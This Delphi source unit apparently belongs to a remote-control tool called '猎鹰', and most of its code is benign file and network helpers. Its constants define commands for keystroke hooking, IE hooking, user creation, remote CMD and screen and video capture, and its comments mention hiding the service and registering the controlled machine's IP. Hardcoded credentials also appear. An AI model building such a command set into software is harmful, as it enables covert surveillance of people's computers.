unit func;

interface
uses classes,windows,ComCtrls,ScktComp,SysUtils,Controls,Graphics,dialogs
,forms,Zip,winsock,messages,funcs,registry,uSocket,uStr;
const
  myname='猎鹰';
  myversion='2.00';
  //myversion='1.010';
  //version='1.005';2006-04-14优化被控端；增加IP到IP服务器的登记；
  //version='1.006';2006-04-25被控端等待超时
  //version='1.007';2006-05-13自动更新；XML信息显示
  //VER='1.008';2006-8-6错误屏蔽;创建共享内存;注册表保护;只启动一个服务;服务隐藏;上传目录错误; cmd;ieheper;
  //  yh监视、yh上传数据 ;取消lovecode.51.net;更换youda2000   ;取消IP过滤；
  //myversion='1.009'; user login pwd
  ClientCID='20060501';//2006-05-13 客户端分类标识
  //2015-09-06
  con_VERSION=1010;  //软件版本
  con_CONTROLED=1;     //程序类别
  con_CONTROL=2;     //程序类别
  con_CON_VER=1001; //通讯协议版本
  con_Encrpt=1;

  con_ID=1010;
  con_nam='byc';
  con_pwd='byc';
//**********************一级命令*******************************
  o_READY=00;
  o_Screen=2010;
  o_KeyMouse=2020;
  o_PCInfo=2030;
  o_TransFiles=2040;
  o_ListDrvs=2050;
  o_ListFileInfos=2060;
  o_ListProcs=2070;
  o_opProc=2080;
  o_Reg=2090;
  o_ReNamePC=2100;
  o_GetPCName=2110;
  o_opHookKey=2120;
  o_HookIE=2150;
  o_UnHookIE=2160;
  o_Close=2170;
  o_Update=2180;
  o_RunFile=2190;
  o_DelFile=2200;
  o_Delete=2210;
  o_CrtDir=2220;
  o_DelDir=2230;
  o_CAD=2240;
  o_Svc=2250;
  o_Reboot=2260;
  o_CrtUser=2270;
  o_TermSvr=2280;
  o_GetCID=2290;    //06-05-13
  o_Add=2300;       //06-05-13
  o_CMD=2310;       //06-08-13
  o_video=2320;       //06-11-11
//************************二级命令**************************
  o_StartHookKey=2121;
  o_GetHookKeys=2122;
  o_CloseHookKey=2123;
  o_StartFileHookKey=2124;
  o_GetFileHookKeys=2125;
  o_CloseFileHookKey=2126;
  o_ClearFileHookKey=2127;

  vmColor2=02;
  vmColor4=04;
  vmColor8=08;
  vmColor16=16;
  vmColor24=24;

  MAXBUF=8192;
  wm_conn=wm_user+100;
type
  PClientInfo=^stClientInfo;
  stClientInfo=packed record
    ID:DWORD;
    Version:DWORD;
    nam:array[0..15] of ansiChar;
    pwd:array[0..15] of ansiChar;
    ClientType:DWORD;
    ClientSate:DWORD;

    Socket:integer;
  end;
  POrdHeader=^stOrdHeader;
  stOrdHeader=packed record
    Version:DWORD;
    Encrpt:DWORD;
    Order:DWORD;
    DataSize:DWORD;
    Data:pointer;
  end;  
  TFileInfo = packed record
    CommpanyName: string;
    FileDescription: string;
    FileVersion: string;
    InternalName: string;
    LegalCopyright: string;
    LegalTrademarks: string;
    OriginalFileName: string;
    ProductName: string;
    ProductVersion: string;
    Comments: string;
    VsFixedFileInfo:VS_FIXEDFILEINFO;
    UserDefineValue:string;
  end;
  PSvrAddr2=^stSvrAddr2;
  stSvrAddr2=packed record
    svr:stSvrAddr;
    dport:Word;
  end;
  PIPServer=^stIPServer;
  stIPServer=record
    svr:stSvrAddr;
    aFile,user,pwd:array[0..31] of ansiChar;
    mysvr:stSvrAddr2;
  end;//aFile:/photo/ip.htm
  {
  tactive=(FRun,FLoad);
  PFunc=^stFunc;
  stFunc=record
    svrfile:array[0..31] of ansiChar;
    lcafile:array[0..31] of ansiChar;
    PID    :DWORD;
    bThread:bool;
    active :tActive;
    params :pansiChar;
    paralen:integer;
  end;
  }
function FileTimeToStr(fileTime:fileTime):string;
function IsDigit(const s:string):boolean;
function BinToStr(buf:pointer;size:integer):string;
function StrToBin(BinStr:string;p:pointer;var size:DWORD):BOOL;
function HexStrToByte(TwoansiChar:PansiChar;OneByte:PByte): BOOL;
function CoordinateFileName(var fileName:string):boolean;
procedure GetFileInfo(FullPathFileName:string;var ss:tstrings);
function TheFileSize(FileName: String):cardinal;
function GetFileVersionInfomation(const FileName: string; var info: TFileInfo;UserDefine:string=''):boolean;
function UniqueStrFromTime:string;
procedure Log(txt,FileName:pansiChar);
procedure GetDateTime(strDateTime:pansiChar);
//function GetFilterIP(const IP:string):string;
function GetWorksFolder(Dir:pansiChar):pansiChar;
//function SetIPServer(PIPServerInfo:pointer):BOOL;stdcall;
function FTPPassiveStrToSvr(str:pansiChar):stSvrAddr;
//function GetHttpDir(httpFullFile,httpDir:pansiChar):pansiChar;
//function strtoint(str:pansiChar;var i:integer):BOOL;
function GetLocalIP(IP:pansiChar):bool;stdcall;
implementation
function GetLocalIP(IP:pansiChar):bool;stdcall;
var
  wd:WSAdata;
  err:integer;
  phe:PhostEnt;
  addr:pansiChar;
  b0,b1,b2,b3:byte;
begin
  result:=false;
  err:=WSAStartup($101,wd);
  if err<>0 then begin wsaCleanup;exit;end;
  phe:=GetHostByName(nil);
  if phe=nil then begin wsaCleanup;exit;end;
  addr:=(phe^.h_addr)^;
  if addr=nil then begin wsaCleanup;exit;end;
  b0:=byte((addr+0)^);b1:=byte((addr+1)^);
  b2:=byte((addr+2)^);b3:=byte((addr+3)^);
  _wsprintf(IP,'%d.%d.%d.%d',[b0,b1,b2,b3]);
  wsaCleanup;
  result:=true;
end;


function FTPPassiveStrToSvr(str:pansiChar):stSvrAddr;
//227 Entering Passive Mode (218,30,110,206,4,121).
var
  p1,p2,p:pansiChar;
  i,j:integer;
  strInt:array[0..11] of ansiChar;
begin
  zeromemory(@result,sizeof(result));
  p:=strscan(str,'(');if p=nil then exit;p:=p+1;
  p1:=strscan(str,')');if p1=nil then exit;p1[0]:=#0;
  p1:=strscan(p,',');i:=0;p2:=nil;
  while p1<>nil do
  begin
    p1[0]:='.';
    inc(i);
    if i=4 then p2:=p1;
    p1:=strscan(p,',');
  end;
  if p2=nil then exit;
  strLcopy(result.IP,p,p2-p);
  zeromemory(@strInt[0],sizeof(strInt));
  p:=p2+1;p1:=strscan(p,'.');strLcopy(strInt,p,p1-p);
  if not strtoint(strInt,i) then exit;
  p:=p1+1;strcopy(strInt,p);
  if not strtoint(strInt,j) then exit;
  result.port:=i*256+j;
end;



function GetWorksFolder(Dir:pansiChar):pansiChar;
var
  me:array[0..MAX_PATH-1] of ansiChar;
begin
  GetModuleFileNameA(hInstance,me,sizeof(me));
  result:=ExtractFileDir(me,Dir);
end;
{
function GetFilterIP(const IP:string):string;
const
  val='FilterIP';
var
  reg:tregistry;
begin
  reg:=tregistry.Create;
  reg.RootKey:=HKEY_LOCAL_MACHINE;
  if reg.OpenKey('SoftWare\Microsoft\byc',true) then
  begin
    if not reg.ValueExists(val) then
      reg.WriteString(val,'');
    result:=reg.ReadString(val);
    if IP<>'' then
    begin
      if(pos(IP,result)<=0) then
      begin
        result:=result+IP+#13#10;
        reg.WriteString(val,result);
      end;
    end;//if IP<>'' then
    reg.CloseKey;
  end;//if
  reg.Free;
end;
}
procedure GetDateTime(strDateTime:pansiChar);
var
  st: TSystemTime;
begin
  GetLocalTime(st);
  _wsprintf(strDateTime,'%4d年%2d月%2d日%2d点%2d分%2d秒%3d毫秒',
    [st.wYear,st.wMonth,st.wDay,st.wHour,st.wMinute,st.wSecond,st.wMilliseconds]);
end;
procedure Log(txt,FileName:pansiChar);
const
  GENERIC_READ             = DWORD($80000000);
  GENERIC_WRITE            = $40000000;
  FILE_SHARE_READ                     = $00000001;
  FILE_SHARE_WRITE                    = $00000002;
  FILE_SHARE_DELETE                   = $00000004;
  CREATE_NEW = 1;
  CREATE_ALWAYS = 2;
  OPEN_EXISTING = 3;
  OPEN_ALWAYS = 4;
  TRUNCATE_EXISTING = 5;
  FILE_ATTRIBUTE_READONLY             = $00000001;
  FILE_ATTRIBUTE_HIDDEN               = $00000002;
  FILE_ATTRIBUTE_SYSTEM               = $00000004;
  FILE_ATTRIBUTE_DIRECTORY            = $00000010;
  FILE_ATTRIBUTE_ARCHIVE              = $00000020;
  FILE_ATTRIBUTE_NORMAL               = $00000080;
  FILE_ATTRIBUTE_TEMPORARY            = $00000100;
  FILE_ATTRIBUTE_COMPRESSED           = $00000800;
  FILE_ATTRIBUTE_OFFLINE              = $00001000;
var
  hFile,writed:cardinal;
  txtLen:integer;
  enter:array[0..1] of ansiChar;
  time:array[0..255] of ansiChar;
begin
  hFile:=createfileA(FileName,GENERIC_WRITE,FILE_SHARE_READ,nil,
                     OPEN_ALWAYS,FILE_ATTRIBUTE_ARCHIVE,0);
  setfilepointer(hFile,0,nil,2);
  txtLen:=strlen(txt);
  if txtLen>0 then
  begin
    GetDateTime(time);strcat(time,'>>>>>>>');
    writefile(hFile,time,strlen(time),writed,nil);
    writefile(hFile,txt^,txtLen,writed,nil);
    enter[0]:=#13;enter[1]:=#10;
    writefile(hFile,enter,2,writed,nil);
  end;
  closehandle(hFile);
end;
function UniqueStrFromTime:string;
var
  Present: TDateTime;
  Year, Month, Day, Hour, Min, Sec, MSec: Word;
  s:string;
begin
  Present:=now();
  DecodeDate(Present, Year, Month, Day);
  DecodeTime(Present, Hour, Min, Sec, MSec);
  s:=format('%4d%2d%2d%2d%2d%2d%3d',[Year,Month,Day,Hour,Min,Sec,MSec]);
  while pos(#32,s)>0 do s[pos(#32,s)]:='0';
  result:=s;
end;
function GetFileVersionInfomation(const FileName: string; var info: TFileInfo;UserDefine:string=''):boolean;
const
  SFInfo= '\StringFileInfo\';
var
  VersionInfo: Pointer;
  InfoSize: DWORD;
  InfoPointer: Pointer;
  Translation: Pointer;
  VersionValue: string;
  unused: DWORD;
begin
  unused := 0;
  Result := False;
  InfoSize := GetFileVersionInfoSizeA(pansiChar(ansiString(FileName)), unused);
  if InfoSize > 0 then
  begin
    GetMem(VersionInfo, InfoSize);
    Result := GetFileVersionInfoA(pansiChar(ansiString(FileName)), 0, InfoSize, VersionInfo);
    if Result then
    begin
      VerQueryValue(VersionInfo, '\VarFileInfo\Translation', Translation, InfoSize);
      VersionValue := SFInfo + IntToHex(LoWord(Longint(Translation^)), 4) +
        IntToHex(HiWord(Longint(Translation^)), 4) + '\';
      VerQueryValueA(VersionInfo, pansiChar(VersionValue + 'CompanyName'), InfoPointer, InfoSize);
      info.CommpanyName := string(pansiChar(InfoPointer));
      VerQueryValueA(VersionInfo, pansiChar(VersionValue + 'FileDescription'), InfoPointer, InfoSize);
      info.FileDescription := string(pansiChar(InfoPointer));
      VerQueryValueA(VersionInfo, pansiChar(VersionValue + 'FileVersion'), InfoPointer, InfoSize);
      info.FileVersion := string(pansiChar(InfoPointer));
      VerQueryValueA(VersionInfo, pansiChar(VersionValue + 'InternalName'), InfoPointer, InfoSize);
      info.InternalName := string(pansiChar(InfoPointer));
      VerQueryValueA(VersionInfo, pansiChar(VersionValue + 'LegalCopyright'), InfoPointer, InfoSize);
      info.LegalCopyright := string(pansiChar(InfoPointer));
      VerQueryValueA(VersionInfo, pansiChar(VersionValue + 'LegalTrademarks'), InfoPointer, InfoSize);
      info.LegalTrademarks := string(pansiChar(InfoPointer));
      VerQueryValueA(VersionInfo, pansiChar(VersionValue + 'OriginalFileName'), InfoPointer, InfoSize);
      info.OriginalFileName := string(pansiChar(InfoPointer));
      VerQueryValueA(VersionInfo, pansiChar(VersionValue + 'ProductName'), InfoPointer, InfoSize);
      info.ProductName := string(pansiChar(InfoPointer));
      VerQueryValueA(VersionInfo, pansiChar(VersionValue + 'ProductVersion'), InfoPointer, InfoSize);
      info.ProductVersion := string(pansiChar(InfoPointer));
      VerQueryValueA(VersionInfo, pansiChar(VersionValue + 'Comments'), InfoPointer, InfoSize);
      info.Comments := string(pansiChar(InfoPointer));
      if VerQueryValue(VersionInfo, '\', InfoPointer, InfoSize) then
        info.VsFixedFileInfo := TVSFixedFileInfo(InfoPointer^);
      if UserDefine<>'' then
      begin
        if VerQueryValueA(VersionInfo,pansiChar(VersionValue+UserDefine),InfoPointer,InfoSize) then
          info.UserDefineValue:=string(pansiChar(InfoPointer));
      end;
    end;
    FreeMem(VersionInfo);
  end;
end;
function TheFileSize(FileName: String):cardinal;
var
  FHandle: THandle;
begin
  if fileexists(filename) then
  begin
    FHandle := CreateFileA(PansiChar(FileName), 0, FILE_SHARE_READ,  nil, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL or FILE_FLAG_SEQUENTIAL_SCAN, 0);
    Result := GetFileSize(FHandle,nil);
    CloseHandle(FHandle);
  end
  else begin
    result:=0;
  end;
end;
procedure GetFileInfo(FullPathFileName:string;var ss:tstrings);
var
 fileAttr:_WIN32_FILE_ATTRIBUTE_DATA;
 fileSysTime:windows._Systemtime;
 fileDateTime:Tdatetime;
 fa,fSize:dword;
 sfa,FileName:string;
 info: TFileInfo;
begin
  ss.Clear;
  FileName:=FullPathFileName;
  if pos('\\?\',FileName)=1 then delete(FileName,1,4);
  if pos('\??\',FileName)=1 then delete(FileName,1,4);
  GetFileAttributesExA (pansiChar(fileName),GetFileExInfoStandard,@fileAttr);
  fa:=fileAttr.dwFileAttributes;
  sfa:='文件属性：';
  if (fa and FILE_ATTRIBUTE_ARCHIVE)<>0 then
    sfa:=sfa+'存档,';
  if (fa and FILE_ATTRIBUTE_HIDDEN)<>0 then
    sfa:=sfa+'隐藏,';
  if (fa and FILE_ATTRIBUTE_READONLY)<>0 then
    sfa:=sfa+'只读,';
  if (fa and FILE_ATTRIBUTE_SYSTEM)<>0 then
    sfa:=sfa+'系统';
  if copy(sfa,length(sfa),1)=',' then
    sfa:=copy(sfa,1,length(sfa)-1);
  ss.Add(sfa);
  fSize:=theFileSize(fileName);
  ss.Add('文件大小：'+sysutils.inttostr(fSize)+'字节');
  FileTimeToSystemTime(fileAttr.ftCreationTime,fileSysTime);
  fileDateTime:=Encodedate (fileSysTime.wYear,fileSysTime.wMonth,fileSysTime.wDay );
  sfa:=datetimetostr(filedatetime);
  ss.Add('创建时间：'+sfa);
  FileTimeToSystemTime(fileAttr.ftLastAccessTime,fileSysTime);
  fileDateTime:=Encodedate (fileSysTime.wYear,fileSysTime.wMonth,fileSysTime.wDay );
  sfa:=datetimetostr(filedatetime);
  ss.Add('访问时间：'+sfa);
  FileTimeToSystemTime(fileAttr.ftLastWriteTime,fileSysTime);
  fileDateTime:=Encodedate (fileSysTime.wYear,fileSysTime.wMonth,fileSysTime.wDay );
  sfa:=datetimetostr(filedatetime);
  ss.Add('更新时间：'+sfa);
  //sfa:=GetSysFileDescription(fileName);
  //if sfa='' then
  //   ss.Add('系统文件：否')
  //else
  //  ss.Add('系统文件：'+sfa);
  try
  ss.add('**************************************文件摘要信息*****************************************');
  if GetFileVersionInfomation(FileName, info,'WOW Version') then
  begin
      ss.Add('注　　释:' + info.Comments);
      ss.Add('文件版本:' + info.FileVersion);
      ss.Add('说　　明:' + info.FileDescription);
      ss.Add('版　　权:' + info.LegalCopyright);
      ss.Add('产品版本:' + info.ProductVersion);
      ss.Add('产品名称:' + info.ProductName);
      ss.Add('公司名称:' + info.CommpanyName);
      ss.Add('内部名称:' + info.InternalName);
      ss.Add('商　　标:' + info.LegalTrademarks);
      ss.Add('原文件名:' + info.OriginalFileName);
      ss.Add('UserDefineValue:' + info.UserDefineValue);
      if boolean(info.VsFixedFileInfo.dwFileFlags and vs_FF_Debug) then
       ss.Add('Debug:True')
       else
       ss.Add('Debug:False');
  end;
  except
  end;
end;
function CoordinateFileName(var fileName:string):boolean;
var
  sysdir:array[0..max_path] of ansiChar;
  i,len:integer;
begin
  GetSystemDirectoryA(sysdir,sizeof(sysdir));
  i:=pos('"',fileName);
  while i>0 do
  begin
    delete(fileName,i,1);
    i:=pos('"',fileName);
  end;
  i:=pos('\SystemRoot\System32',fileName);
  len:=length('\SystemRoot\System32');
  if i=1 then
  begin
    delete(fileName,i,len);
    fileName:=sysdir+fileName;
  end;
  i:=pos('system32',fileName);
  len:=length('system32');
  if i=1 then
  begin
    delete(fileName,i,len);
    fileName:=sysdir+fileName;
  end;

  i:=pos('%SystemRoot%\System32',fileName);
  len:=length('%SystemRoot%\System32');
  if i=1 then
  begin
    delete(fileName,i,len);
    fileName:=sysdir+fileName;
  end;
  i:=pos('\??\',fileName);
  len:=length('\??\');
  if i=1 then
  begin
    delete(fileName,i,len);
  end;
  i:=pos(' ',fileName);
  if i>0 then
  begin
    len:=length(fileName)-i+1;
    delete(fileName,i,len);
  end;
  result:=fileexists(FileName);
end;
function HexStrToByte(TwoansiChar:PansiChar;OneByte:PByte): BOOL;
var
  c:ansiChar;
begin
  result:=true;
  c:=TwoansiChar[0];
  case c of
      '0'..'9':  OneByte^ := Byte(c) - Byte('0');
      'a'..'f':  OneByte^ := (Byte(c) - Byte('a')) + 10;
      'A'..'F':  OneByte^ := (Byte(c) - Byte('A')) + 10;
  else
      Result :=false;exit;
  end;//case
  OneByte^:=OneByte^*16;
  c:=TwoansiChar[1];
  case c of
      '0'..'9':  OneByte^ :=OneByte^+Byte(c) - Byte('0');
      'a'..'f':  OneByte^ :=OneByte^+(Byte(c) - Byte('a')) + 10;
      'A'..'F':  OneByte^ :=OneByte^+(Byte(c) - Byte('A')) + 10;
  else
      Result :=false;exit;
  end;//case
end;
function StrToBin(BinStr:string;p:pointer;var size:DWORD):BOOL;
//BinStr:a0~b1~
var
  ByteStr:string;
begin
  result:=false;
  if p=nil then
  begin
    size:=length(BinStr) div 3;
    if size=0 then exit;
    if length(BinStr) mod 3>0 then exit;
    result:=true;
  end
  else begin
    while length(BinStr)>0 do
    begin
      ByteStr:=copy(BinStr,1,2);
      if not HexstrToByte(pansiChar(ByteStr),PByte(p)) then exit;
      inc(pByte(p));
      delete(BinStr,1,3);
    end;//while
    result:=true;
  end;//if buf=nil then
end;
function BinToStr(buf:pointer;size:integer):string;
var
  i:integer;
  pb:PBYTE;
  p:pointer;
begin
  i:=size;
  p:=buf;
  while i>0 do
  begin
    pb:=p;
    result:=result+inttohex(pb^,2)+' ';
    inc(DWORD(p));
    dec(i);
  end;
end;
function IsDigit(const s:string):boolean;
var
  i:integer;
begin
  result:=false;
  for i:=1 to length(s) do
  begin
    if not (s[i] in ['0','1','2','3','4','5','6','7','8','9']) then exit;
  end;//for
  result:=true;
end;
function FileTimeToStr(fileTime:fileTime):string;
var
  LocalFileTime:tfiletime;
  sysTime:windows.tSystemTime;
begin
  filetimetolocalfiletime(fileTime,localFileTime);
  FileTimeToSystemTime(localFileTime,sysTime);
  result:=DateToStr(SystemTimeToDateTime(SysTime));
end;

end.
